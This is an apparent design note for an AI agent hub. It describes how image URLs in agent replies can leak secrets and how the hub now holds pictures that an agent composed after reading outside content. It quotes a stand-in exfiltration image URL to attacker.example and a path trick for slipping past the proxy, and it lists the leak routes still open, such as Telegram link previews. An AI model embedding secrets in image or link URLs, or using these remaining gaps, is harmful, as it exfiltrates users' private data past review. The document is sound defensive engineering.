# Pictures: what the hub fetches when a chat shows an image

2026-11-02. Follows `2026-11-02-tainted-egress-design.md`, which listed images in agent replies as an open channel.

## The gap

The web UI loads every picture through the hub (`/api/media?url=…`, CSP `img-src 'self'`). An agent reply with
`![x](https://attacker.example/p.png?d=<secret>)` made the hub fetch that address as soon as the chat showed it:
no tool call, no review, no click. The same held for `show_images`, `show_news` cards, channel posts' pictures and
page covers, and for the iOS app (its chat is the hub's page; its channel list loads post pictures through
`/api/media`), the desktop app (the hub's page) and Telegram (Telegram's servers fetch an `images` part by its URL).
A relative `![](/api/media?url=…)` or `![](/p/<id>/<token>/img?url=…)` in a reply went straight to the proxies too.

## The rule

The hub decides about a picture when the content that holds it is stored, where the session is known, and keeps the
verdict per address in `pictures(url, state)` (`packages/core/src/policy/pictures.ts`):

- **shown**: the session had not read outside content, or the address carries nothing new by the tainted-egress rule
  (`EgressGuard.check`): a picture found in what the session read (a page's images, an og:image, a feed's picture),
  one the person gave, one that already went out, or a plain address on a host the person named;
- **held**: anything else: an address the agent put together after outside content, on a host nobody named, or with
  long, encoded or nested values.

Where it is decided: the runner's text deltas (Markdown images and reference definitions, before the delta goes to
the clients), every gateway tool call's input before it runs (picture fields such as `image`, `cover`, `images[].url`,
and Markdown images in any text: `show_images`, `show_news`, `feed_post`, `page_*`, notes, memory), and the person's
own messages (always shown). A verdict is about the address's bytes: once shown it stays shown; held becomes shown
only when the person asks. Content stored before this change counts as shown (a one-time backfill).

`/api/media` fetches only shown addresses (or serves an earlier copy from its cache, which sends nothing out); a held
or never-decided one answers 403 `media.held`. Plugin UIs (`@piomio/ui` `mediaSrc`, e.g. the browser's favicons) ask
with `from=plugin` and keep the old behaviour for never-decided addresses; held ones stay refused everywhere, the
pages' image route included. Telegram gets only shown pictures.

## In the clients

- A picture that does not load asks `/api/media/state`; a held one becomes a quiet line "Picture from <host>" with
  **Show**. Show is `POST /api/media/show` (the person's choice, audited), then the picture loads. No card, nothing for
  the reviewer: the person sees the host and decides with one tap.
- News thumbnails, channel posts' pictures and page covers simply stay out when held; the item and its link remain.
- In agent Markdown, a local source is shown only when it is a workspace file (`/api/files`) or the proxy itself
  (rewritten to the canonical proxy address); `/p/…` and other hub routes stay links. Paths are resolved first, so
  `/./p/…` does not slip past.
- iOS: the chat is the hub's page (covered); its native channel list gets 403 for held pictures and draws the empty
  frame. Its Markdown views (memory, inbox) use AttributedString, which loads no images.

## Known limits

- Pages an agent makes run their own code: their image route refuses held addresses but fetches never-decided ones on
  open (one click, not zero). Their API route keeps its host list. A page made after outside content is a separate gap.
- Plugin widgets drawing an agent's picture through `@piomio/ui` `mediaSrc` keep the old behaviour for addresses the
  hub never decided.
- Telegram previews the first link of a reply, and its formatter turns a Markdown picture in the words into a link: an
  address the agent wrote into its words (a link, or a picture there) can still reach that site through Telegram's
  servers. `images` parts are covered (only shown ones are sent); link previews after outside content are a follow-up.
- A Markdown form the hub's scanner reads differently from the client's parser is held (a false hold, never a leak).
- Verdicts replicate with the database; a replica that missed one holds the picture (more taps, never a leak).

## Tests

`packages/core/test/pictures.test.ts` (scanner, verdicts, backfill); `show-media.test.ts` end to end with the fake
brain's `PICTURE` reply: decided before the delta reaches clients, held after outside content, shown when found, the
proxy's 403 / cached copy / plugin mode, Show and its audit line, the person's own picture, a tool's held picture kept
from the phone. Web `lib/media.test.ts` for the local-source rules. Checked by hand in a throwaway hub: a held picture
reads "Picture from <host> · Show" in the words and in a card, and loads after Show.
